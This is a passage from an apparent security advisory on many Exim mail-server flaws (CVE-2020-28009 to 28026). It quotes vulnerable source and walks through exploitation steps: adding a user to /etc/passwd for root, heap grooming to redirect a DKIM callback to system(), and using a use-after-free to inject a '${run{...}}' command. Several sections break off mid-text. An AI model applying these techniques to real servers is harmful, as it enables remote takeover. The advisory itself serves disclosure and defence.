end of the communication pipe is not closed-on-exec and an unprivileged
local attacker can therefore send arbitrary data to the privileged Exim
process (which is running as root).

------------------------------------------------------------------------
Exploitation
------------------------------------------------------------------------

We exploit this vulnerability through the following code in
rda_interpret(), which reads our arbitrary data in the privileged Exim
process:

------------------------------------------------------------------------
791 fd = pfd[pipe_read];
792 if (read(fd, filtertype, sizeof(int)) != sizeof(int) ||
793     read(fd, &yield, sizeof(int)) != sizeof(int) ||
794     !rda_read_string(fd, error)) goto DISASTER;
...
804     if (!rda_read_string(fd, &s)) goto DISASTER;
...
956   *error = string_sprintf("internal problem in %s: failure to transfer "
957     "data from subprocess: status=%04x%s%s%s", rname,
958     status, readerror,
959     (*error == NULL)? US"" : US": error=",
960     (*error == NULL)? US"" : *error);
961   log_write(0, LOG_MAIN|LOG_PANIC, "%s", *error);
------------------------------------------------------------------------

where:

------------------------------------------------------------------------
467 static BOOL
468 rda_read_string(int fd, uschar **sp)
469 {
470 int len;
471
472 if (read(fd, &len, sizeof(int)) != sizeof(int)) return FALSE;
...
479   if (read(fd, *sp = store_get(len, FALSE), len) != len) return FALSE;
480 return TRUE;
481 }
------------------------------------------------------------------------

- at line 794, we allocate an arbitrary string (of arbitrary length),
  error;

- at line 804 (and line 479), we back-jump to the beginning of the heap
  (Digression 1b) and avoid the forward-overflow (Digression 1a) because
  our len is negative;

- at line 956, we overwrite the beginning of the heap with a string that
  we control (error); we tried to overwrite Exim's configuration strings
  (Digression 2) but failed to execute arbitrary commands; instead, we
  overwrite file_path, a copy of log_file_path (mentioned in
  CVE-2020-28007);

- at line 961, we append an arbitrary string that we control (error) to
  a file whose name we control (file_path): we add an arbitrary user to
  /etc/passwd and obtain full root privileges.

This first version of our exploit succeeds on Debian oldstable's
exim4_4.89-2+deb9u7 (it fails on Debian stable's exim4_4.92-8+deb10u4
because of a gstring_reset_unused() in string_sprintf(); we have not
tried to work around this problem), but it fails on Debian testing's
exim4_4.94-8: the pool of memory that we back-jump at line 804 is
untainted, but the string at line 956 is tainted and written to a
different pool of memory (because our primary recipient, and hence
rname, are tainted).

To work around this problem, our "exim filter" generates a secondary
recipient that is naturally untainted (line 479). When this secondary
recipient is processed, the string at line 956 is untainted and thus
overwrites the beginning of the heap (because it is allocated in the
untainted pool of memory that we back-jumped at line 804): this second
version of our exploit also succeeds on Debian testing.

Finally, we use one noteworthy trick in our exploit: in theory, the
string that overwrites file_path at line 956 cannot be longer than 256
bytes (LOG_NAME_SIZE); this significantly slows our brute-force of the
correct back-jump distance. In practice, we can overwrite file_path with
a much longer string (up to 8KB, LOG_BUFFER_SIZE) because file_path is a
format string, and "%0Lu" (or "%.0D") is a NOP in Exim's string_format()
function: it consumes no argument and produces no output, thus avoiding
the overflow of buffer[LOG_NAME_SIZE] in open_log().

========================================================================
CVE-2020-28009: Integer overflow in get_stdinput()
========================================================================

The following loop reads lines from stdin as long as the last character
of the lines is '\\' (line 1273). Each line that is read is appended to
a "growable string", the gstring g (at line 1266):

------------------------------------------------------------------------
1229 gstring * g = NULL;
....
1233 for (i = 0;; i++)
1234   {
1235   uschar buffer[1024];
....
1252     if (Ufgets(buffer, sizeof(buffer), stdin) == NULL) break;
1253     p = buffer;
....
1258   ss = p + (int)Ustrlen(p);
....
1266   g = string_catn(g, p, ss - p);
....
1273   if (ss == p || g->s[g->ptr-1] != '\\')
1274     break;
------------------------------------------------------------------------

Eventually, the integer g->size of the growable string overflows, and
becomes negative (in gstring_grow(), which is called by string_catn()).
Consequently, in store_newblock() (which is called by gstring_grow()),
newsize is negative:

------------------------------------------------------------------------
506 void *
507 store_newblock_3(void * block, int newsize, int len,
508   const char * filename, int linenumber)
509 {
510 BOOL release_ok = store_last_get[store_pool] == block;
511 uschar * newtext = store_get(newsize);
512
513 memcpy(newtext, block, len);
514 if (release_ok) store_release_3(block, filename, linenumber);
515 return (void *)newtext;
516 }
------------------------------------------------------------------------

- the store_get() at line 511 back-jumps the current block of memory
  (Digression 1b);

- the memcpy() at line 513 forward-overflows the current block of memory
  (Digression 1a).

If exploitable, this vulnerability would allow an unprivileged local
attacker to obtain full root privileges. We have not tried to exploit
this vulnerability, because it took more than 5 days to overflow the
integer g->size. Indeed, the loop in get_stdinput() has an O(n^2) time
complexity: for each line that is read, store_newblock() allocates a new
block of memory (at line 511) and recopies the entire contents of the
growable string (at line 513).

========================================================================
CVE-2020-28017: Integer overflow in receive_add_recipient()
========================================================================

By default, Exim does not limit the number of recipients (the number of
valid RCPT TO commands) for a mail. But after 52428800 (50M) recipients,
the multiplication at line 492 overflows, and the size that is passed to
store_get() becomes negative (2*50M * 40B = -96MB):

------------------------------------------------------------------------
 484 void
 485 receive_add_recipient(uschar *recipient, int pno)
 486 {
 487 if (recipients_count >= recipients_list_max)
 488   {
 489   recipient_item *oldlist = recipients_list;
 490   int oldmax = recipients_list_max;
 491   recipients_list_max = recipients_list_max ? 2*recipients_list_max : 50;
 492   recipients_list = store_get(recipients_list_max * sizeof(recipient_item));
 493   if (oldlist != NULL)
 494     memcpy(recipients_list, oldlist, oldmax * sizeof(recipient_item));
 495   }
------------------------------------------------------------------------

- at line 492, store_get() back-jumps the current block of memory
  (Digression 1b), by -96MB;

- at line 494, memcpy() forward-overflows the current block of memory
  (Digression 1a), by nearly 2GB (50M * 40B = 2000MB).

Initially, we thought that CVE-2020-28017 would be the perfect
vulnerability:

- it affects all versions of Exim (since at least the beginning of its
  Git history in 2004);

- it is certainly exploitable (an unauthenticated RCE as the "exim"
  user): the forward-overflow can be absorbed to avoid a crash, and the
  back-jump can be directed onto Exim's configuration (Digression 2);

- a back-of-the-envelope calculation suggested that an exploit would
  require "only" 6GB of memory: 2*2GB for all the recipients_lists, and
  2GB of recipient addresses to absorb the forward-overflow.

Eventually, however, we abandoned the exploitation of CVE-2020-28017:

- On Exim 4.89 (Debian oldstable), the ACLs (Access Control Lists) for
  the RCPT TO command consume approximately 512 bytes per recipient: an
  exploit would require more than 50M * 512B = 25GB of memory. Instead,
  we decided to exploit another vulnerability, CVE-2020-28020, which
  requires only 3GB of memory.

- On Exim 4.92 (Debian stable), the ACLs for RCPT TO consume at least
  4KB per recipient. Indeed, this version's string_sprintf() allocates a
  whole new 32KB memory block, but uses only one page (4KB): an exploit
  would require more than 50M * 4KB = 200GB of memory.

- On Exim 4.94 (Debian testing), the problem with string_sprintf() was
  solved, and an exploit would therefore require "only" 25GB of memory.
  However, the "tainted" checks create another problem: each RCPT TO
  allocates T blocks of tainted memory, and makes U is_tainted() checks
  on untainted memory, but each check traverses the complete linked list
  of tainted memory blocks. For n recipients, this has an O(n^2) time
  complexity (roughly U*T*(n^2)/2): it would take months to reach 50M
  recipients.

CVE-2020-28017 is also exploitable locally (through -bS and
smtp_setup_batch_msg(), which does not have ACLs), and would allow an
unprivileged local attacker to obtain the privileges of the "exim" user.
But better vulnerabilities exist: CVE-2020-28015 and CVE-2020-28012 are
locally exploitable and yield full root privileges.

CVE-2020-28020: Integer overflow in receive_msg()
========================================================================

During our work on Exim, we stumbled across the following commit:

------------------------------------------------------------------------
commit 56ac062a3ff94fc4e1bbfc2293119c079a4e980b
Date:   Thu Jan 10 21:15:11 2019 +0000
...
+JH/41 Fix the loop reading a message header line to check for integer overflow,
+      and more-often against header_maxsize.  Previously a crafted message could
+      induce a crash of the recive process; now the message is cleanly rejected.
...
+    if (header_size >= INT_MAX/2)
+      goto OVERSIZE;
     header_size *= 2;
------------------------------------------------------------------------

This vulnerability is exploitable in all Exim versions before 4.92 and
allows an unauthenticated remote attacker to execute arbitrary commands
as the "exim" user. Because this commit was not identified as a security
patch, it was not backported to LTS (Long Term Support) distributions.
For example, Debian oldstable's package (exim4_4.89-2+deb9u7) contains
all known security patches, but is vulnerable to CVE-2020-28020 and
hence remotely exploitable.

By default, Exim limits the size of a mail header to 1MB
(header_maxsize). Unfortunately, an attacker can bypass this limit by
sending only continuation lines (i.e., '\n' followed by ' ' or '\t'),
thereby overflowing the integer header_size at line 1782:

------------------------------------------------------------------------
1778   if (ptr >= header_size - 4)
1779     {
1780     int oldsize = header_size;
1781     /* header_size += 256; */
1782     header_size *= 2;
1783     if (!store_extend(next->text, oldsize, header_size))
1784       {
1785       BOOL release_ok = store_last_get[store_pool] == next->text;
1786       uschar *newtext = store_get(header_size);
1787       memcpy(newtext, next->text, ptr);
1788       if (release_ok) store_release(next->text);
1789       next->text = newtext;
1790       }
1791     }
------------------------------------------------------------------------

Ironically, this vulnerability was the most difficult to exploit:

- when the integer header_size overflows, it becomes negative (INT_MIN),
  but we cannot exploit the resulting back-jump at line 1786 (Digression
  1b), because the free size of the current memory block also becomes
  negative (because 0 - INT_MIN = INT_MIN, the "Leblancian Paradox"),
  which prevents us from writing to this back-jumped memory block;

- to overflow the integer header_size, we must send 1GB to Exim:
  consequently, our exploit must succeed after only a few tries (in
  particular, we cannot brute-force ASLR).

Note: we can actually overflow header_size with 1GB / 2 = 512MB; if we
send a first line that ends with "\r\n", then Exim transforms every bare
'\n' that we send into "\n " (a continuation line):

------------------------------------------------------------------------
1814   if (ch == '\n')

------------------------------------------------------------------------
Exploitation
------------------------------------------------------------------------

To exploit this vulnerability (on Debian oldstable, for example):

1/ We send three separate mails (in the same SMTP session) to achieve
the following memory layout:

                              mmap memory
-----|-------------------|-------------------|-------------------|-----
 ... |n|l|    mblock3    |n|l|    mblock2    |n|l|    mblock1    | ...
-----|-------------------|-------------------|+------------------|-----
                                              |
                              heap memory     |
                    -------------------------|v-------------|-----
                     ... |N|L|N|L|N|L|N|L|N|L|n|l|  hblock  | ...
                    -------------------------|--------------|-----
                         <- fake storeblock ->

where n and l are the next and length members of a storeblock structure
(a linked list of allocated memory blocks):

------------------------------------------------------------------------
 71 typedef struct storeblock {
 72   struct storeblock *next;
 73   size_t length;
 74 } storeblock;
------------------------------------------------------------------------

- we first allocate a 1GB mmap block (mblock1) by sending a mail that
  contains a 256MB header of bare '\n' characters; the next member of
  mblock1's storeblock structure initially points to a heap block
  (hblock, which immediately follows data that we control);

- we allocate a second 1GB mmap block (mblock2) by sending a mail that
  also contains a 256MB header of bare '\n' characters;

- we allocate a third 1GB mmap block (mblock3) by sending a mail that
  contains a 512MB header; this overflows the integer header_size, and
  forward-overflows mblock3 (Digression 1a), into mblock2 and mblock1:
  we overwrite mblock2's next pointer with NULL (to avoid a crash in
  store_release() at line 1788) and we partially overwrite mblock1's
  next pointer (with a single null byte).

2/ After this overflow, store_reset() traverses the linked list of
allocated memory blocks and follows mblock1's overwritten next pointer,
to our own "fake storeblock" structure: a NULL next pointer N (to avoid
a crash in store_reset()), and a large length L that covers the entire
address space (for example, 0x7050505070505050). As a result, Exim's
allocator believes that the entire heap is one large, free block of
POOL_MAIN memory (Exim's main type of memory allocations).

This powerful exploit primitive gives us write access to the entire
heap, through POOL_MAIN allocations. But the heap also contains other
types of allocations: we exploit this primitive to overwrite POOL_MAIN
allocations with raw malloc()s (for information disclosure) and to
overwrite POOL_PERM allocations with POOL_MAIN allocations (for
arbitrary code execution).

3/ Information disclosure:

- First, we send an EHLO command that allocates a large string in raw
  malloc() memory.

- Second, we send an invalid RCPT TO command that allocates a small
  string in POOL_MAIN memory (an error message); this small POOL_MAIN
  string overwrites the beginning of the large malloc() string.

- Next, we send an invalid EHLO command that free()s the large malloc()
  string; this free() overwrites the beginning of the small POOL_MAIN
  string with a pointer to the libc (a member of libc's malloc_chunk
  structure).

- Last, we send an invalid DATA command that responds with an error
  message: the small, overwritten POOL_MAIN string, and hence the libc
  pointer. This information leak is essentially the technique that we
  used for CVE-2015-0235 (GHOST).

4/ Arbitrary code execution:

- First, we start a new mail (MAIL FROM, RCPT TO, and DATA commands);
  this calls dkim_exim_verify_init() and allocates a pdkim_ctx structure
  in POOL_PERM memory (DKIM is enabled by default since Exim 4.70):

------------------------------------------------------------------------
249 typedef struct pdkim_ctx {
...
263   int(*dns_txt_callback)(char *, char *);
...
274 } pdkim_ctx;
------------------------------------------------------------------------

- Second, we send a mail header that is allocated to POOL_MAIN memory,
  and overwrite the pdkim_ctx structure: we overwrite dns_txt_callback
  with a pointer to libc's system() function (we derive this pointer
  from the information-leaked libc pointer).

- Next, we send a "DKIM-Signature:" header (we particularly care about
  its "selector" field).

- Last, we end our mail; this calls dkim_exim_verify_finish(), which
  calls the overwritten dns_txt_callback with a first argument that we
  control (through the selector field of our "DKIM-Signature:" header):

------------------------------------------------------------------------
1328 dns_txt_name = string_sprintf("%s._domainkey.%s.", sig->selector, sig->domain);
....
1333 if (  ctx->dns_txt_callback(CS dns_txt_name, CS dns_txt_reply) != PDKIM_OK
------------------------------------------------------------------------

  In other words, we execute system() with an arbitrary command.

========================================================================
CVE-2020-28023: Out-of-bounds read in smtp_setup_msg()
========================================================================

In smtp_setup_msg(), which reads the SMTP commands sent by a client to
the Exim server:

------------------------------------------------------------------------
1455 int     smtp_ch_index          = 0;
....
1459 uschar  smtp_connection_had[SMTP_HBUFF_SIZE];
------------------------------------------------------------------------
 126 #define HAD(n) \
 127     smtp_connection_had[smtp_ch_index++] = n; \
 128     if (smtp_ch_index >= SMTP_HBUFF_SIZE) smtp_ch_index = 0
....
5283     case DATA_CMD:
5284       HAD(SCH_DATA);
....
5305           smtp_printf("503 Valid RCPT command must precede %s\r\n", FALSE,
5306             smtp_names[smtp_connection_had[smtp_ch_index-1]]);
------------------------------------------------------------------------

- line 5284 (line 128 in HAD()) can reset smtp_ch_index to 0 (an index
  into the circular buffer smtp_connection_had[]);

- line 5306 therefore reads smtp_connection_had[-1] out-of-bounds (an
  unsigned char index into the array smtp_names[]);

- depending on the value of this unsigned char index, line 5306 may also
  read smtp_names[smtp_connection_had[-1]] out-of-bounds (a pointer to a
  string);

- and line 5305 sends this string to the SMTP client and may therefore
  disclose sensitive information to an unauthenticated remote attacker.

On Debian, this out-of-bounds read is not exploitable, because
smtp_connection_had[-1] is always 0 and line 5305 sends smtp_names[0]
("NONE") to the client. However, the memory layout of the Exim binary
may be more favorable to attackers on other operating systems.

========================================================================
CVE-2020-28021: New-line injection into spool header file (remote)
========================================================================

An authenticated SMTP client can add an AUTH= parameter to its MAIL FROM
command. This AUTH= parameter is decoded by auth_xtextdecode():

------------------------------------------------------------------------
4697           case ENV_MAIL_OPT_AUTH:
....
4703               if (auth_xtextdecode(value, &authenticated_sender) < 0)
------------------------------------------------------------------------

and the resulting authenticated_sender is written to the spool header
file without encoding or escaping:

------------------------------------------------------------------------
212 if (authenticated_sender)
213   fprintf(fp, "-auth_sender %s\n", authenticated_sender);
------------------------------------------------------------------------

Unfortunately, authenticated_sender can contain arbitrary characters,
because auth_xtextdecode() translates hexadecimal +XY sequences into
equivalent characters (for example, +0A into '\n'): an authenticated
remote attacker can inject new lines into the spool header file and
execute arbitrary commands, as root.

This vulnerability is particularly problematic for Internet service
providers and mail providers that deploy Exim and offer mail accounts
but not shell accounts. It is also problematic when combined with an
authentication bypass such as CVE-2020-12783, discovered by Orange Tsai
in May 2020 (<https://bugs.exim.org/show_bug.cgi?id=2571>).

------------------------------------------------------------------------
Exploitation
------------------------------------------------------------------------

Our exploit for CVE-2020-28021 is essentially the same as our exploit
for CVE-2020-28015. The main difference is that Exim's ACLs limit the
length of our header lines to 998 characters. However, this limit can be
easily bypassed, by splitting long header lines into 990-character lines
separated by "\n " (i.e., continuation lines).

We can also transform CVE-2020-28021 into an information disclosure:

- First, we inject an arbitrary recipient line into the spool header
  file: an arbitrary recipient address (for example, attacker@...e.com)
  and an errors_to string that is read out-of-bounds (the same technique
  as for CVE-2020-28015).

- Next, we wait for Exim to connect to our own mail server, fake.com's
  MX (we use <https://github.com/iphelix/dnschef> to set up a quick and
  easy DNS server).

- Last, we retrieve the out-of-bounds errors_to string from Exim's MAIL
  FROM command (which, in this example, contains a fragment of
  /etc/passwd):

========================================================================
CVE-2020-28022: Heap out-of-bounds read and write in extract_option()
========================================================================

The name=value parameters such as AUTH= are extracted from MAIL FROM and
RCPT TO commands by extract_option():

------------------------------------------------------------------------
1994 static BOOL
1995 extract_option(uschar **name, uschar **value)
1996 {
1997 uschar *n;
1998 uschar *v = smtp_cmd_data + Ustrlen(smtp_cmd_data) - 1;
....
2001 while (v > smtp_cmd_data && *v != '=' && !isspace(*v))
2002   {
....
2005   if (*v == '"') do v--; while (*v != '"' && v > smtp_cmd_data+1);
2006   v--;
2007   }
2008
2009 n = v;
------------------------------------------------------------------------

Unfortunately, this function can decrease v (value) and hence n (name)
out of smtp_cmd_data's bounds (into the preceding smtp_cmd_buffer):

- at line 2001, v can point to smtp_cmd_data + 1;

- at line 2005, v-- decrements v to smtp_cmd_data;

- at line 2006, v-- decrements v to smtp_cmd_data - 1.

Subsequently, the code in extract_option() and smtp_setup_msg() reads
from and writes to v and n out of smtp_cmd_data's bounds.

If exploitable, this vulnerability would allow an unauthenticated remote
attacker to execute arbitrary commands as the "exim" user. So far we
were unable to exploit this vulnerability: although we are able to
decrease v and n out of smtp_cmd_data's bounds, we were unable to
decrease v or n out of the preceding smtp_cmd_buffer's bounds.
Surprisingly, however, we do use this vulnerability in our
proof-of-concept for CVE-2020-28026.

========================================================================
CVE-2020-28026: Line truncation and injection in spool_read_header()
========================================================================

spool_read_header() calls fgets() to read the lines from a spool header
file into the 16KB big_buffer. The first section of spool_read_header()
enlarges big_buffer dynamically if fgets() truncates a line (if a line
is longer than 16KB):

------------------------------------------------------------------------
 460   if (Ufgets(big_buffer, big_buffer_size, fp) == NULL) goto SPOOL_READ_ERROR;
 ...
 462   while (  (len = Ustrlen(big_buffer)) == big_buffer_size-1
 463         && big_buffer[len-1] != '\n'
 ...
 468     buf = store_get_perm(big_buffer_size *= 2, FALSE);
------------------------------------------------------------------------

Unfortunately, the second section of spool_read_header() does not
enlarge big_buffer:

------------------------------------------------------------------------
 756 for (recipients_count = 0; recipients_count < rcount; recipients_count++)
 ...
 765   if (Ufgets(big_buffer, big_buffer_size, fp) == NULL) goto SPOOL_READ_ERROR;
------------------------------------------------------------------------

If DSN (Delivery Status Notification) is enabled (it is disabled by
default), an attacker can send a RCPT TO command with a long ORCPT=
parameter that is written to the spool header file by
spool_write_header():

------------------------------------------------------------------------
292 for (int i = 0; i < recipients_count; i++)
293   {
294   recipient_item *r = recipients_list + i;
...
302     uschar * errors_to = r->errors_to ? r->errors_to : US"";
...
305     uschar * orcpt = r->orcpt ? r->orcpt : US"";
306
307     fprintf(fp, "%s %s %d,%d %s %d,%d#3\n", r->address, orcpt, Ustrlen(orcpt),
308       r->dsn_flags, errors_to, Ustrlen(errors_to), r->pno);
------------------------------------------------------------------------

This long ORCPT= parameter truncates the recipient line (when read by
fgets() in spool_read_header()) and injects the remainder of the line as
a separate line, thereby emulating the '\n' injection of CVE-2020-28015
and CVE-2020-28021 (albeit in a weaker form).

We have not tried to exploit this vulnerability; if exploitable, it
would allow an unauthenticated remote attacker to execute arbitrary
commands as root (if DSN is enabled).

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------

- Intuitively, it seems impossible to generate a recipient line longer
  than 16KB (big_buffer_size), because the Exim server reads our RCPT TO
  command into a 16KB buffer (smtp_cmd_buffer) that must also contain
  (besides our long ORCPT= parameter) "RCPT TO:", "NOTIFY=DELAY", and
  the recipient address.

- We can, however, use the special recipient "postmaster", which is
  automatically qualified (by appending Exim's primary hostname) before
  it is written to the spool header file. This allows us to enlarge the
  recipient line, but is not sufficient to control the end of the
  truncated line (unless Exim's primary hostname is longer than 24
  bytes, which is very unlikely).

- But we can do better: we can use CVE-2020-28022 to read our ORCPT=
  parameter out of smtp_cmd_data's bounds (from the end of the preceding
  smtp_cmd_buffer). This allows us to further enlarge the recipient line
  (by 10 bytes, because "postmaster" is now included in our ORCPT=), but
  is not sufficient to reliably control the end of the truncated line
  (unless Exim's primary hostname is longer than 14 bytes, which is
  still very unlikely).

- But we can do much better: we do not need postmaster's automatic
  qualification anymore, because the recipient is now included in our
  ORCPT= parameter -- the longer the recipient, the better. On Debian,
  the user "systemd-timesync" exists by default, and "localhost" is one
  of Exim's local_domains: the recipient "systemd-timesync@...alhost" is
  long enough to reliably control the end of the truncated recipient
  line, and allows us to read and write out of big_buffer's bounds
  (lines 859 and 863, and beyond):

------------------------------------------------------------------------
 840   else if (*p == '#')
 ...
 848     (void)sscanf(CS p+1, "%d", &flags);
 849
 850     if ((flags & 0x01) != 0)      /* one_time data exists */
 851       {
 852       int len;
 853       while (isdigit(*(--p)) || *p == ',' || *p == '-');
 854       (void)sscanf(CS p+1, "%d,%d", &len, &pno);
 855       *p = 0;
 856       if (len > 0)
 857         {
 858         p -= len;
 859         errors_to = string_copy_taint(p, TRUE);
 860         }
 861       }
 862
 863     *(--p) = 0;   /* Terminate address */

========================================================================
CVE-2020-28019: Failure to reset function pointer after BDAT error
========================================================================

To read SMTP commands and data from a client, Exim calls the function
pointer receive_getc, which points to either smtp_getc() (a cleartext
connection) or tls_getc() (an encrypted connection). If the client uses
the BDAT command (instead of DATA) to send a mail, then Exim saves the
current value of receive_getc to the function pointer lwr_receive_getc
and sets receive_getc to the wrapper function bdat_getc():

------------------------------------------------------------------------
5242     case BDAT_CMD:
....
5271       lwr_receive_getc = receive_getc;
....
5275       receive_getc = bdat_getc;
------------------------------------------------------------------------

Exim normally resets receive_getc to its original value
(lwr_receive_getc) when the client ends its mail. Unfortunately, Exim
fails to reset receive_getc in some cases; for example, if the mail is
larger than message_size_limit (50MB by default). Consequently, Exim
re-enters smtp_setup_msg() while receive_getc still points to
bdat_getc(), and:

- smtp_read_command() calls receive_getc and hence bdat_getc(), which
  also calls smtp_read_command(), which is not a re-entrant function and
  may have unintended consequences;

- if the client issues another BDAT command, then receive_getc and
  lwr_receive_getc both point to bdat_getc(), which calls itself
  recursively and leads to stack exhaustion; for example:

------------------------------------------------------------------------
(
sleep 10;
echo 'EHLO test';

CVE-2020-28024: Heap buffer underflow in smtp_ungetc()

Exim calls smtp_refill() to read input characters from an SMTP client
into the 8KB smtp_inbuffer, and calls smtp_getc() to read individual
characters from smtp_inbuffer:

------------------------------------------------------------------------
 501 static BOOL
 502 smtp_refill(unsigned lim)
 503 {
 ...
 512 rc = read(fileno(smtp_in), smtp_inbuffer, MIN(IN_BUFFER_SIZE-1, lim));
 ...
 515 if (rc <= 0)
 516   {
 ...
 536   return FALSE;
 537   }
 ...
 541 smtp_inend = smtp_inbuffer + rc;
 542 smtp_inptr = smtp_inbuffer;
 543 return TRUE;
 544 }
------------------------------------------------------------------------
 559 int
 560 smtp_getc(unsigned lim)
 561 {
 562 if (smtp_inptr >= smtp_inend)
 563   if (!smtp_refill(lim))
 564     return EOF;
 565 return *smtp_inptr++;
 566 }
------------------------------------------------------------------------

Exim implements an smtp_ungetc() function to push characters back into
smtp_inbuffer (characters that were read from smtp_inbuffer by
smtp_getc()):

------------------------------------------------------------------------
 795 int
 796 smtp_ungetc(int ch)
 797 {
 798 *--smtp_inptr = ch;
 799 return ch;
 800 }
------------------------------------------------------------------------

Unfortunately, Exim also calls smtp_ungetc() to push back "characters"
that were not actually read from smtp_inbuffer: EOF (-1), and if BDAT is
used, EOD and ERR (-2 and -3). For example, in receive_msg():

------------------------------------------------------------------------
1945   if (ch == '\r')
1946     {
1947     ch = (receive_getc)(GETC_BUFFER_UNLIMITED);
1948     if (ch == '\n')
1949       {
....
1952       }
....
1957     ch = (receive_ungetc)(ch);
------------------------------------------------------------------------

- at line 1947, receive_getc (smtp_getc()) can return EOF;

- at line 1957, this EOF is passed to receive_ungetc (smtp_ungetc());

- at line 798 (in smtp_ungetc()), if smtp_inptr is exactly equal to
  smtp_inbuffer, then it is decremented to smtp_inbuffer - 1, and EOF is
  written out of smtp_inbuffer's bounds.

To return EOF in receive_msg() while smtp_inptr is equal to
smtp_inbuffer, we must initiate a TLS-encrypted connection:

- either through TLS-on-connect (usually on port 465), which does not
  use smtp_inptr nor smtp_inbuffer;

- or through STARTTLS, which resets smtp_inptr to smtp_inbuffer in the
  following code (if X_PIPE_CONNECT is enabled, the default since Exim
  4.94):

------------------------------------------------------------------------
5484       if (receive_smtp_buffered())
5485         {
5486         DEBUG(D_any)
5487           debug_printf("Non-empty input buffer after STARTTLS; naive attack?\n");
5488         if (tls_in.active.sock < 0)
5489           smtp_inend = smtp_inptr = smtp_inbuffer;
------------------------------------------------------------------------

In both cases:

- first, we initiate a TLS-encrypted connection, which sets receive_getc
  and receive_ungetc to tls_getc() and tls_ungetc() (while smtp_inptr is
  equal to smtp_inbuffer);

- second, we start a mail (MAIL FROM, RCPT TO, and DATA commands) and
  enter receive_msg();

- third, we send a bare '\r' character and reach line 1945;

- next, we terminate the TLS connection, which resets receive_getc and
  receive_ungetc to smtp_getc() and smtp_ungetc() (while smtp_inptr is
  still equal to smtp_inbuffer);

- last, we close the underlying TCP connection, which returns EOF at
  line 1947 and writes EOF out of smtp_inbuffer's bounds at line 1957
  (line 798 in smtp_ungetc()).

We have not tried to exploit this vulnerability; if exploitable, it
would allow an unauthenticated remote attacker to execute arbitrary
commands as the "exim" user (if TLS and either TLS-on-connect or
X_PIPE_CONNECT are enabled).

========================================================================
CVE-2020-28018: Use-after-free in tls-openssl.c
========================================================================

If Exim is built with OpenSSL, and if STARTTLS is enabled, and if
PIPELINING is enabled (the default), and if X_PIPE_CONNECT is disabled
(the default before Exim 4.94), then tls_write() in tls-openssl.c is
vulnerable to a use-after-free.

If PIPELINING is used, Exim buffers the SMTP responses to MAIL FROM and
RCPT TO commands (in tls-openssl.c):

------------------------------------------------------------------------
2909 int
2910 tls_write(void * ct_ctx, const uschar *buff, size_t len, BOOL more)
2911 {
....
2915 static gstring * server_corked = NULL;
2916 gstring ** corkedp = ct_ctx
2917   ? &((exim_openssl_client_tls_ctx *)ct_ctx)->corked : &server_corked;
2918 gstring * corked = *corkedp;
....
2933 if (!ct_ctx && (more || corked))
2934   {
....
2940   corked = string_catn(corked, buff, len);
....
2946   if (more)
2947     {
2948     *corkedp = corked;
2949     return len;
2950     }
------------------------------------------------------------------------

- at line 2910, ct_ctx is NULL, buff contains the SMTP response, and
  more is true;

- at line 2940, a struct gstring (a "growable string", mentioned in
  CVE-2020-28009) and its string buffer are allocated in POOL_MAIN
  memory:

------------------------------------------------------------------------
 29 typedef struct gstring {
 30   int   size;           /* Current capacity of string memory */
 31   int   ptr;            /* Offset at which to append further chars */
 32   uschar * s;           /* The string memory */
 33 } gstring;
------------------------------------------------------------------------

- at line 2948, a pointer to the struct gstring is saved to a local
  static variable, server_corked.

Unfortunately, if smtp_reset() is called (in smtp_setup_msg()), then
store_reset() is called and frees all allocated POOL_MAIN memory, but
server_corked is not reset to NULL: if tls_write() is called again, the
struct gstring and its string buffer are used-after-free.

Side note: another use-after-free, CVE-2017-16943, was discovered by Meh
Chang in November 2017 (<https://bugs.exim.org/show_bug.cgi?id=2199>).

------------------------------------------------------------------------
Exploitation
------------------------------------------------------------------------

To reliably control this vulnerability, we must prevent Exim from
calling tls_write() between our call to smtp_reset() and the actual
use-after-free:

- first, we send EHLO and STARTTLS (to initiate a TLS connection);

- second, we send EHLO and "MAIL FROM:<>\nNO" (to pipeline the first
  half of a NOOP command, and to buffer the response to our MAIL FROM
  command in tls_write());

- third, we terminate the TLS connection (and fall back to cleartext)
  and send "OP\n" (the second half of our pipelined NOOP command);

- next, we send EHLO (to force a call to smtp_reset()) and STARTTLS (to
  re-initiate a TLS connection);

- last, server_corked is used-after-free (in tls_write()) in response to
  any SMTP command that we send.

This use-after-free of a struct gstring (server_corked) and its string
buffer (server_corked->s) is the most powerful vulnerability in this
advisory:

1/ We overwrite the string buffer (which is sent to us by tls_write())
and transform this use-after-free into an information leak (we leak
pointers to the heap).

2/ We overwrite the struct gstring (with an arbitrary string pointer and
size) and transform the use-after-free into a read-what-where primitive:
we read the heap until we locate Exim's configuration.

3/ We overwrite the struct gstring (with an arbitrary string pointer)
and transform the use-after-free into a write-what-where primitive: we
overwrite Exim's configuration with an arbitrary "${run{command}}" that
is executed by expand_string() as the "exim" user (Digression 2).

We use a few noteworthy tricks in our exploit:

1/ Information leak: To overwrite the string buffer without overwriting
the struct gstring itself, we send several pipelined RCPT TO commands to
re-allocate the string buffer (far away from the struct gstring), and
overwrite it with header_line structures that contain pointers to the
heap.

2/ Read-what-where: We overwrite the struct gstring with arbitrary
binary data through the name=value parameter of a MAIL FROM command:

- we overwrite the s member with a pointer to the memory that we want to
  read (a pointer to the heap);

- we overwrite the ptr member with the number of bytes that we want to
  read;

- we overwrite the size member with the same number as ptr to prevent
  string_catn() from writing to the memory that we want to read (at line
  2940 in tls_write()).

3/ Write-what-where: We overwrite the struct gstring with arbitrary
binary data through the name=value parameter of a MAIL FROM command:

- we overwrite the s member with a pointer to the memory that we want to
  overwrite (a pointer to Exim's configuration);

- we overwrite the ptr member with 0 and the size member with a large
  arbitrary number;

- finally, we send a MAIL FROM command whose response overwrites Exim's
  configuration with our arbitrary "${run{...}}" (which is eventually
  executed by expand_string()).

Note: Debian's Exim packages are built with GnuTLS, not OpenSSL; to
rebuild them with OpenSSL, we followed the detailed instructions at
<https://gist.github.com/ryancdotorg/11025731>.

------------------------------------------------------------------------

========================================================================
CVE-2020-28025: Heap out-of-bounds read in pdkim_finish_bodyhash()
========================================================================

By default since Exim 4.70, receive_msg() calls
dkim_exim_verify_finish() to verify DKIM (DomainKeys Identified Mail)
signatures, which calls pdkim_feed_finish(), which calls
pdkim_finish_bodyhash():

------------------------------------------------------------------------
 788 static void
 789 pdkim_finish_bodyhash(pdkim_ctx * ctx)
 790 {
 ...
 799 for (pdkim_signature * sig = ctx->sig; sig; sig = sig->next)
 800   {
 ...
 825     if (  sig->bodyhash.data
 826        && memcmp(b->bh.data, sig->bodyhash.data, b->bh.len) == 0)
